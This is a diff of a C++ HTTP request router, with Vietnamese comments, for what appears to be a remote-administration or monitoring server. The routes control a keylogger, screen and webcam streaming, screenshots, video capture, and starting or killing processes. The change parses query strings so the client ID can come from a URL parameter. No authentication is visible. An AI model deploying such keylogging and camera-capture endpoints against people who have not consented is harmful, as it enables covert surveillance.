@@ -3,25 +3,14 @@
 #include "utils/helpers.h"
 #include "utils/logging.h"
 #include <sstream>
-#include <stdexcept> // Can cho std::exception
+#include <stdexcept>
 
 using namespace std;
 
-RequestRouter::RequestRouter()
-{
-    // Constructor
-}
+RequestRouter::RequestRouter() {}
 
-/**
- * @brief Ham chinh xu ly ket noi tu mot client.
- * Duoc goi boi server.cpp trong mot luong rieng.
- */
 void RequestRouter::handleClient(SOCKET client, string clientIP)
 {
-    // *** START: THEM TRY...CATCH DE CHONG SAP SERVER ***
-    // Boc toan bo logic trong try...catch
-    // De neu co bat ky loi nao (vi du: stoi("")),
-    // server se khong bi sap, ma chi dong ket noi voi client nay.
     try
     {
         char buf[4096];
@@ -35,19 +24,57 @@ void RequestRouter::handleClient(SOCKET client, string clientIP)
         string reqStr(buf), method, path, body;
 
         istringstream iss(reqStr);
-        iss >> method >> path;
+        iss >> method; // Chi lay 'method'
+
+        // --- MOI: Lay fullPath (bao gom query string) ---
+        size_t pathStart = reqStr.find(' ') + 1;
+        if (pathStart == string::npos)
+        { // Yeu cau khong hop le
+            closesocket(client);
+            return;
+        }
+        size_t pathEnd = reqStr.find(' ', pathStart);
+        if (pathEnd == string::npos)
+            pathEnd = reqStr.find("\r\n", pathStart);
+
+        string fullPath = reqStr.substr(pathStart, pathEnd - pathStart);
+
+        // Lay path 'sach' (khong co query) de so sanh
+        size_t queryPos = fullPath.find('?');
+        if (queryPos != string::npos)
+        {
+            path = fullPath.substr(0, queryPos);
+        }
+        else
+        {
+            path = fullPath;
+        }
+        // --- KET THUC THAY DOI ---
+
         size_t bodyPos = reqStr.find("\r\n\r\n");
         if (bodyPos != string::npos)
             body = reqStr.substr(bodyPos + 4);
 
+        // --- THAY DOI LOGIC LAY ID ---
         string clientId = getHeader(reqStr, "X-Client-ID");
-        if (clientId.empty())
-            clientId = clientIP;
 
-        // --- Dieu phoi yeu cau GET ---
+        if (clientId.empty())
+        {
+            // Bay gio chung ta tim trong 'fullPath', khong phai 'path'
+            if (path.find("/api/stream") == 0 || path.find("/screenshot") == 0)
+            {
+                clientId = getQueryParam(fullPath, "clientId", true);
+            }
+
+            if (clientId.empty())
+            {
+                clientId = clientIP; // Fallback
+            }
+        }
+        // --- KET THUC THAY DOI ---
+
         if (method == "GET")
         {
-            // API (JSON hoac Stream)
             if (path.find("/api") == 0)
             {
                 if (path == "/api/processes")
@@ -57,31 +84,26 @@ void RequestRouter::handleClient(SOCKET client, string clientIP)
                 else if (path.find("/api/keylog") == 0)
                     m_keylogController.handleGetKeylog(client);
                 else if (path.find("/api/devices") == 0)
-                    m_deviceController.handleGetDevices(client, path);
+                    m_deviceController.handleGetDevices(client, fullPath, clientId); // Truyen fullPath
                 else if (path.find("/api/stream/screen") == 0)
                     m_screenController.handleScreenStream(client, clientId);
                 else if (path.find("/api/stream/cam") == 0)
-                    m_deviceController.handleStreamCam(client, path, clientId);
+                    m_deviceController.handleStreamCam(client, fullPath, clientId); // Truyen fullPath
                 else
                     sendFileResponse(client, "404 API Not Found", "text/plain", 404);
             }
-            // *** START: SUA LOI LOGIC CHUP ANH ***
-            // Chup anh (Screenshot) KHONG phai la /api
             else if (path.find("/screenshot") == 0)
             {
-                m_screenController.handleScreenshot(client, path, clientId);
+                m_screenController.handleScreenshot(client, fullPath, clientId); // Truyen fullPath
             }
-            // *** END: SUA LOI LOGIC CHUP ANH ***
-
-            // File tinh (HTML, CSS, JS, MP4)
             else
             {
                 m_staticFileController.handleFileRequest(client, path, clientId);
             }
         }
-        // --- Dieu phoi yeu cau POST ---
         else if (method == "POST")
         {
+            // ... (POST logic khong doi, vi no luon dung header X-Client-ID) ...
             if (path == "/api/start")
                 m_appController.handleStartApp(client, body);
             else if (path == "/api/kill")
@@ -93,7 +115,13 @@ void RequestRouter::handleClient(SOCKET client, string clientIP)
             else if (path == "/api/keylog/set")
                 m_keylogController.handleSetKeylog(client, body);
             else if (path == "/api/clientlog")
-                logConsole(clientId, getQueryParam(body, "msg", true)); // Log don gian
+            {
+                string msg = getQueryParam(body, "msg", true);
+                string success_str = getQueryParam(body, "success", false);
+                string prefix = (success_str == "true") ? "[OK] " : "[FAIL] ";
+                logConsole(clientId, prefix + msg);
+                sendAll(client, "HTTP/1.1 204 No Content\r\n\r\n");
+            }
             else if (path == "/api/video/capture")
                 m_deviceController.handleRecordVideo(client, body, clientId);
             else
@@ -102,22 +130,16 @@ void RequestRouter::handleClient(SOCKET client, string clientIP)
 
         closesocket(client);
     }
-    // *** START: THEM TRY...CATCH DE CHONG SAP SERVER ***
     catch (const std::exception &e)
     {
-        // Neu co bat ky loi nao, ghi log ra server
-        // (Vi du: loi stoi("") se bi bat o day)
         logConsole(clientIP, "LOI NGHIEM TRONG: " + string(e.what()));
-        // Gui phan hoi loi 500 cho client
         sendFileResponse(client, "500 Internal Server Error", "text/plain", 500);
-        closesocket(client); // Dong ket noi loi
+        closesocket(client);
     }
     catch (...)
     {
-        // Bat tat ca cac loi khac
         logConsole(clientIP, "LOI KHONG XAC DINH!");
         sendFileResponse(client, "500 Internal Server Error", "text/plain", 500);
         closesocket(client);
     }
-    // *** END: THEM TRY...CATCH DE CHONG SAP SERVER ***
 }
